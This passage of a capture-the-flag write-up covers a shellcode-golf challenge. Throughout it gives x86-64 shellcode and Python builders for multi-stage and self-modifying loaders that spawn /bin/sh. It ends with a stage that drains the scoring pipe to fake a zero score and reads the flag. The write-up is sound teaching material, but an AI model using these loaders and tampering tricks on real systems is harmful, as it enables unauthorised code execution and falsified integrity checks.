 96    xchg eax, esi        ; rsi = page (read destination), rax = 0 = SYS_read
 0f 05 syscall              ; read(0, page, some_large_number)
```

We need `rax = 0` (SYS_read), `rdi = 0` (stdin), `rsi = buffer`, and `rdx` = some non-tiny count. At entry `rax = page` and everything else is 0, so `rdi` is already correct. `xchg eax, esi` gets us `rax = 0` and `rsi = page` in one byte. `pop rdx` grabs the return address main pushed, which is a large valid count. Done.

Two timing/aliasing gotchas bit us here:
- The stage 1 `read` writes stage 2 *over* the page, starting at the same address. After the `syscall` byte, RIP sits a few bytes into the page, so stage 2 has to be padded with NOPs so that execution lands on the start of the real `execve`, not in the middle of it.
- The follow-up shell commands have to arrive *after* `/bin/sh` has actually started, hence a second small pause.

Once we padded stage 2 correctly (`90909090...`), the multi-stage solve worked end to end at score 260.

### Beating 260 with math (sum 189)
260 felt like the minimum for the "obvious" `pop rdx; xchg; syscall` solution, and for a while we argued it was optimal: we *must* end with `xchg eax, esi` (0x96 = 150) - otherwise we need even more bytes - and `syscall` (0x0f 0x05 = 20), and getting a usable `rdx` seemed to cost at least a `pop rdx` (0x5a = 90).

The next improvement was realizing `rdx` does not need a `pop`. We only need `rdx` to be anything outside of [0...8]. Reading a dword out of our own shellcode does that for free in the sense that the source bytes are already on the page:

```
03 10 96 0f 05              ; sum 189
 03 10  add edx, [rax]      ; rdx += dword at page -> some large value (> 8)
 96     xchg eax, esi       ; rsi = page, rax = 0 = SYS_read
 0f 05  syscall             ; read(0, page, rdx)
```

`03 10` (8) is much cheaper than `5a` (90), so the byte sum dropped from 260 to 189.

### Self-modifying code: build the expensive byte from a cheap one (sum 123 -> 110)
The next big achievement was this: Note the single most expensive byte in stage 1 is `0x96` (the `xchg eax, esi`), worth 150 on its own. We focused on somehow reducing that because this would have the biggest impact. Given that we have our own RWX page and its address is pre-loaded into `rax`, we can modify our own code at runtime, and we remembered that there are sveral instructions at very low byte cost that can add to memory involving the `rax`/`eax`/`ah`/`al` register.

Our address is static because it comes from passing a desired page address to `mmap` (which will pretty much never fail). It is `rax = 0x1337000`, so at entry we get `ah = 0x70` for free!

So instead of *spending* a literal `0x96`, we drop a cheaper byte with value `0x96 - 0x70 = 0x26` and *patch it into* `0x96` at runtime, hopefully with instructions that cost less than `0x70` themselves.

The first cut of this idea moved `rax` with a full `add eax, imm32`:

```
05 09 00 00 00 00 20 03 10 26 0f 05    ; sum 123, self-modifying
 05 09000000  add eax, 9               ; rax -> page+9 (this also shifts stage 2
                                       ;   9 bytes further back when it gets read in)
 00 20        add [rax], ah            ; [rax] += 0x70:  0x26 -> 0x96
 03 10        add edx, [rax]           ; load the now-modified dword as the read count
 26           ???   -> xchg eax, esi   ; after patching becomes 0x96, this is the xchg
 0f 05        syscall                  ; read(0, page+9, big) - the real stage 2 lands
                                       ;   here after the shift
```

The `ah` here is `0x70` (from `mmap(0x1337000, ...)`), and `0x26 + 0x70 = 0x96`, so we get our `xchg esi, eax` back. The catch is that `add eax, 9` is a 5-byte `imm32` form, and those four `00` immediate bytes are free but the `05 09` opcode/operand still costs 14.

We then realized the move can be done with a 2-byte `add al, 6` instead of the 5-byte `add eax, 9`. `al` is the low byte of `rax`, so adding to it advances the pointer just as well, for far fewer bytes:

```
04 06 00 20 03 10 26 0f 05             ; sum 119, self-modifying
 04 06        add al, 6                ; rax -> page+6 (also shifts stage 2 now by 6 B)
 00 20        add [rax], ah            ; [rax] += 0x70:  0x26 -> 0x96
 03 10        add edx, [rax]           ; load the now-modified dword as the read count
 26           ???   -> xchg eax, esi   ; after patching becomes 0x96, this is the xchg
 0f 05        syscall                  ; read(0, page+6, big) - the real stage 2 lands
                                       ;   here after the shift
```

We then squeezed out a bit more by switching from `add` to `sbb` so the donor could be an even cheaper byte (`0x100 - 0x96 = 0x76`, so we now only need a `0x76 - 0x70 = 0x06` byte!), and by using `add dl` instead of `add edx` (`02` instead of `03`):

```
04 06 18 20 02 10 06 0f 05             ; sum 110, self-modifying
 04 06        add al, 6                ; rax -> page+6 (also shifts stage 2 by 6 B)
 18 20        sbb [rax], ah            ; [rax] = [rax] - ah - CF = 0x06 - 0x70 = 0x96
 02 10        add dl, [rax]            ; load the now-modified byte as the read count
 06           ???   -> xchg eax, esi   ; after patching becomes 0x96, this is the xchg
 0f 05        syscall                  ; read(0, page+6, big) - the real stage 2 lands
                                       ;   here after the shift
```

### The (mostly) all-zeros loader: arithmetic slides, woo-hoo (sum 46 -> 23)
This is where the structure changed completely, and where the byte-sum really collapsed.

The next revelation was the following observation: a `0x00` byte costs nothing toward the score. And `00 00` decodes as `add byte ptr [rax], al`, i.e. "add `al` to the byte that `rax` points at". So a long run of `00 00 00 00 ...` is simultaneously free *and* a usable instruction: it is a slide that keeps adding `al` into `[rax]`. Initially, it can act as sort of a "nop slide" because it adds zero to the first payload byte, and once we modify `al`, we change both the write target address _and_ the value we add to that byte, so once it is nonzero, it can be used as incrementing/adding primitive.

> "Unbelievable, I finally have an unironic use of `00 00` other than telling me I am executing uninitialized memory!" - Cherry

So we fill almost the entire payload with free `0x00` bytes and use a handful of cheap "construction" instructions to *build* the real code in-place, at the very end of the page, out of those zeros.

The very first version of this (sum 46) only built the single expensive `0x96` byte that way and left everything else literal. The tail is the `02 10 96 0f 05` read primitive (the same `add dl, [rax]; xchg eax, esi; syscall` method we had at 110), but with the `0x96` synthesized from a free slide (please excuse the different formatting of the payloads from here on, as I simply based them on our internal communications and didn't go back to reformat them for the writeup):

```
$+0     103x  00 00          add [rax], al      ; rax still = page base, al = 0, so true nops
$+CE          05 01020000    add eax, 0x201     ; rax -> page+0x201, al = 1
$+D3    150x  00 00          add [rax], al      ; al = 1, x150 -> builds 0x96 at the 96 slot
$+1FF         02 10          add dl, [rax]       ; literal: read count from the byte we built
$+201         00 -> 96       xchg eax, esi       ; the slid byte, now 0x96
$+202         0F 05          syscall             ; read(0, ..., big)
```

The cost is just `05 01 02 00 00` (8) + `02 10` (18) + `0F 05` (20) = **46**; every `00 00` slide byte is free. So even though we still execute a literal `02 10` and a literal `0f 05`, we no longer *pay* for the 150-weight `0x96`.

Next, we tried to build more of those bytes from zero slides as well, advancing the write pointer between slots with cheap `add al, 1` / `add eax, 1` moves instead of spending full literal opcode bytes. This version points `rax` at `0x201`, fully slides the `0x96` byte up from `0x00`, then advances and slides the `0x0f` one up from a literal `0x01` (instead of a literal `0x0f`), keeping the `0x10` still literal. Using `add eax, 1` instead of `add al, 1` once was needed to keep the alignment right because each `00 00` slide adds 2 bytes to the IP. This way, we got to sum 37, but unfortunately the exact payload seems to be lost.

We created a Python script for creating these payloads now. For a version with sum 26, all the three middle bytes in `02 10 96 0f 05` are now constructed (leaving `02` and `05` alone because constructing those would be ROI-negative):

```python
load = (
    bytes.fromhex("05 01 02 00 00") +   # add eax, 0x201 -> rax = page+x+1, al = 1
    b"\x00\x00" * (0x10 // 1) +         # slide x0x10 (step 1) -> tail[+1] = 0x10
    bytes.fromhex("05 01 00 00 00") +   # add eax, 1 (dword form) -> al = 2, rax -> x+2
    b"\x00\x00" * (0x96 // 2) +         # slide x0x4b (step 2) -> tail[+2] = 0x96
    bytes.fromhex("04 01") +            # add al, 1 -> al = 3, rax -> x+3
    b"\x00\x00" * (0x0f // 3) +         # slide x5 (step 3) -> tail[+3] = 0x0f
    bytes.fromhex("02 00 00 00 05")     # donor: 02 00 00 00 05 -> 02 10 96 0f 05
)
loader = b"\x00" * (0x200 - (len(load) - 5)) + load
# sum(loader) == 26
```

This even aligns so nicely that we can use zero donor bytes for all three constructed bytes, because `0x96` is conveniently divisble by 2 and `0x0f` by 3, respectively.

Cost: `05 01 02 00 00` (8) + `05 01 00 00 00` (6) + `04 01` (5) + `02 ... 05` (7) = **26**.

As a side-effect, we had to make our stage 2 now smaller too because `rdx` is the last-constructed byte which is now `0x0f` instead of `0x96`, so we had to turn stage 2 into another `read` and do the `execve` in a new stage 3, and have the `cat` as a stage 4.

The final step to sum 23 swaps the 5-byte read primitive `02 10 96 0f 05` back to the previous 4-byte one, `5a 96 0f 05` (`pop rdx; xchg eax, esi; syscall`). The `5a` (`pop rdx`) was expensive to *type* literally, which is why we avoided it earlier, but here it is built from a free slide just like the other bytes, so it costs nothing extra and removes a whole constructed byte from the tail:

```python
load = (
    bytes.fromhex("05 01 02 00 00") +   # add eax, 0x201 -> rax = page+0x201, al = 1
    b"\x00\x00" * (0x5a // 1) +         # add [rax], al  x0x5a  -> byte[0x201] = 0x5a
    bytes.fromhex("04 01") +            # add al, 1 -> al = 2, so rax low byte -> 0x202
    b"\x00\x00" * (0x96 // 2) +         # add [rax], al  x0x4b  -> byte[0x202] = 0x96
    bytes.fromhex("04 01") +            # add al, 1 -> al = 3, rax low byte -> 0x203
    b"\x00\x00" * (0x0f // 3) +         # add [rax], al  x5     -> byte[0x203] = 0x0f
    bytes.fromhex("00 00 00 05")        # donor: 00 00 00 05 -> 5a 96 0f 05
)
loader = b"\x00" * (0x201 - (len(load) - 4)) + load
# sum(loader) == 23
```

As a nice side-effect, this also allowed us to get rid of the dword-form of `add [rax], al` we previously added for alignment, saving another 1 point.

The result is the same `5a 96 0f 05` stage 1 read primitive as before, but now its byte-sum is paid almost entirely in free zeros: 8 + 5 + 5 + 5 = 23

### Using the address bytes multiple times (sum 21)
We then cut this down even further to 21. The expensive part of the score-23 builder is the long run of single-byte `add [rax], al` slides: each one only adds `al` (a small number) to *one* byte, and between byte slots we have to spend an `add al, 1` move which alone costs us 5 points already.

A lot of trial and error resulted in this: We can do a few `add dword ptr [rax], eax` (`01 00`) instructions first, which add the *whole* `eax` (which is `0x1337301` at that point, i.e. the tail address) across *all four* tail bytes at once. The free address bytes `0x73` and `0x33` sitting inside `eax` do a big chunk of the construction for us, for almost nothing:

```python
# tail target at 0x301 is 96 5a 0f 05 (xchg eax,esi; pop rdx; syscall)
# note we swap xchg/pop order vs here so the address-byte math works out
loader = (
    b"\x00" * 0x180
    + bytes.fromhex("05 01 03 00 00")   # add eax, 0x301 -> rax = page+0x301, al = 1
    + bytes.fromhex("01 00") * 3        # add [rax], eax  x3  (eax = 0x1337301)
    + b"\x00\x00" * 147                 # add [rax], al   x147 (al = 1) -> finish 0x96
    + bytes.fromhex("04 02")            # add al, 2 -> al = 3, rax -> page+0x303
    + b"\x00\x00" * 39                  # add [rax], al   x39 (al = 3) -> finish 0x0f
    + bytes.fromhex("00 01 00 02")      # donor tail
)
assert sum(loader) == 21
```

The original tail is `00 01 00 02` (dword `0x02000100`), and the three `add [rax], eax` walk it like this, adding `0x1337301` each time:

```
original       00 01 00 02      (dword 0x02000100)
+0x1337301  -> 01 74 33 03      (dword 0x03337401)
+0x1337301  -> 02 e7 66 04      (dword 0x0466e702)
+0x1337301  -> 03 5a 9a 05      (dword 0x059a5a03)
```

_Look at what fell out for free!_ byte `+1` is already `0x5a` and byte `+3` is already `0x05`, both built entirely from the address byte `0x73` (three times `0x73 = 0x159`, low byte `0x59`, plus the donor/carry gives `0x5a`) and the address byte `0x01` (three times plus the `0x02` donor gives `0x05`). Those are the two bytes we previously had to grind out with long `add al` slides, and now they cost nothing.

That leaves only two bytes to finish with cheap single-byte slides:
- byte `+0` is at `0x03`, and `add al, 1` 147 times (`al` is 1 here) brings it to `0x03 + 0x93 = 0x96`.
- `add al, 2` bumps `al` to 3 and `rax` to `page+0x303`, then `add [rax], al` times 39 brings byte `+3` from `0x9a` up to `0x9a + 39*3 = 0x10f -> 0x0f` (wrapping mod 256).

So the whole thing executes to `96 5a 0f 05`, the same read primitive as before (just with `96` and `5a` swapped), and the cost is just the construction bytes: `05 01 03 00 00` (9) + `01 00` x3 (3) + `04 02` (6) + donor `00 01 00 02` (3) = **21**. Compared to the version with sum 23, the three `add [rax], eax` (cost 3 total) replace one whole `add al` move *and* a large amount of slide work, by letting the free address bytes do the heavy lifting.

### `ret` back into main: a free second read (sum 13 -> 12)
The next big improvement came from complete change of strategy of the final constructed payload. Instead of building a `read` syscall, build a single `ret` and bounce back into `main`, which worked because `main` could be found on the stack!

The working final payload was `c2 20 00` = `ret 0x20`. This returns to `main` but pops an extra `0x20` bytes off the stack, bringing a slot that still holds the address of `main` (or the startup glue that calls it) to the top of the stack so the final `ret` of `main` returns to it, so we re-enter `main` and get a second, fresh `read` to pull in the real `execve` payload.

We build it with the exact same all-zeros slide machinery as the read-primitive versions, except the only thing we construct now is those three bytes at `0x201`:

```python
load = (
    bytes.fromhex("05 01 02 00 00") +   # add eax, 0x201 -> rax = page+0x201, al = 1
    b"\x00\x00" * 0xc2 +                # add [rax], al  x0xc2 (al=1) -> byte[0x201] = 0xc2
    bytes.fromhex("04 01") +            # add al, 1 -> al = 2, rax -> page+0x202
    b"\x00\x00" * 0x10                  # add [rax], al  x0x10 (al=2) -> byte[0x202] = 0x20
)
loader = b"\x00" * (0x201 - len(load)) + load
# byte[0x203] stays 0x00, so the constructed code at 0x201 is: c2 20 00
# sum(loader) == 13
```

which lands this at `0x201` when control reaches it:

```
c2 20 00     ret 0x20      ; pop return address off the stack, then rsp += 0x20
```

Why does the score stay at 13 instead of being overwritten by that second, much larger read? Because of how `/diet-level` behaves, as we already noticed at the very beginning: the first run already wrote `13` into it, writing again seems to not affect the value being read at the end,so we pay 13 for the loader and get an effectively free second read for the real exploit.

We prepared one more solution with a new clever trick to get the score down to 12, the idea was to _start_ with `01 00` so that `33 01` gets written to the third and fourth code byte (scrambling the first two which were already executed, so it doesn't matter). Be having the original bytes there be `02 00 02 00 00`, we generate `xor eax, 0x201` for cheaper, but now we have to overcome the misaligned address of the final code area because we have no "nop slide" at the very beginning, and the solution here is to put a `02 00` (`add [rax], al`) after the construction code, pointing `rax` into some part of the buffer we don't care about:

```
000  01 00                                        add [rax], eax
002  02 00 02 00 00 => becomes 35 01 02 00 00     xor eax, 0x201
005  00 00 * 194                                  add [rax], al
189  04 01                                        add al, 1
18B  00 00 * 32                                   add [rax], al
1AB  02 00                                        add al, [rax]
1AD  00 00 * 42                                   add [rax], al
201  00 00 00       => becomes C2 20 00           ret 0x20
```

**However, we never submitted this one, because something much more exciting was discovered at the same time!**

### The cheesy punchline: `/diet-level` is a pipe, so read it first (sum 0 🧀)
Here is the idea that beat everyone, and the one we had been staring at the whole time.

Early on, someone floated the obvious cheese: "what if the shellcode just opens `/diet-level` again and writes a zero to it?" We tried it, it did nothing, and we moved on. The reason it failed: we only *wrote*...

Turns out, `/diet-level` is a **pipe**, not a regular file (which we even pointed out at the start, but we didn't think it through). The binary writes our real score (4 bytes) into it *before* calling our shellcode, and the scoreboard on the other end reads 4 bytes per tick. Because a pipe is FIFO, the binary's value is sitting at the *front*. If we just append our own `00 00 00 00`, the scoreboard still reads the binary's value first. Our zero is queued behind it and ignored. (It's not possible to "truncate" when opening a pipe for writing like it would be with a regular file, you always "append".)

While we were working on the sum 12 payload, someone said "have you tried reading the pipe first?"... Pure facepalm moment! Yes, our shellcode has to **read from `/diet-level` first to drain it**, consuming the 4 bytes the binary already wrote, and *then* write its own `00 00 00 00`. Now the only value in the pipe is ours, and the scoreboard reads `0`.

The exploit shellcode (delivered via the multi-stage loader, so its own byte-sum is irrelevant) does exactly this:

```
open("/diet-level", O_RDONLY | O_NONBLOCK) ; get a read handle on the pipe
read(fd, buf, 0x100)                       ; DRAIN the 4 bytes chal wrote (our real score)
open("/diet-level", O_WRONLY | O_NONBLOCK) ; get a write handle
write(fd, zero4, 4)                        ; push our own 00 00 00 00
... busy delay, then open/read/write /flag to also grab the flag text ...
```

There is a small race: the scoreboard might read the pipe in the window between the binary's write and our overwrite. But, we get essentially a full scheduling quantum right after the binary's `read` returns, so as long as the scoreboard reader is not running on another core at that exact instant, we win the race, and in practice it is reliable. It worked almost immediately, after just a handful of attempts.

We also tried writing a *negative* value to undercut 0, but the organizers confirmed negatives are not counted, so **0 is the best possible score**, and we had it.

```python
def build_race_diag_stage() -> bytes:
    return bytes.fromhex(
        # build "/diet-level" on the stack
        "48bb76656c0000000000" "53"
        "48bb2f646965742d6c65" "53"
        # read_fd = open("/diet-level", O_RDONLY | O_NONBLOCK)
        "4889e7" "be00080000" "31d2" "b802000000" "0f05" "89442418"
        # n = read(read_fd, buf, 0x100)  -- DRAIN the value chal wrote
        "c744244044444444" "89c7" "488d742440" "ba00010000" "31c0" "0f05" "8944241c"
        ...
        # write_fd = open("/diet-level", O_WRONLY | O_NONBLOCK)
        "4889e7" "be01080000" "31d2" "b802000000" "0f05" "89442424"
        # write(write_fd, zero_bytes, 4)
        "89c7" "488d74240b" "ba04000000" "b801000000" "0f05" "89442428"
        ...
        # then open/read/write /flag to print the flag too
    )
```

## Outcome
By the end we were submitting a diet-level of **0**, which is the floor, while most of the field was either honestly golfing toward the admin's 10 or brute-forcing the read search space (and so would never stumble onto the pipe drain). That jumped us from somewhere around rank 20-30 into the top group and the maximum per-tick points.

We could not realistically catch the Top 5 on the final scoreboard, because KotH accumulates points over the whole contest and we found the 0 too late to make up the earlier deficit, but holding the best-possible score for the remainder still pulled us up dramatically.

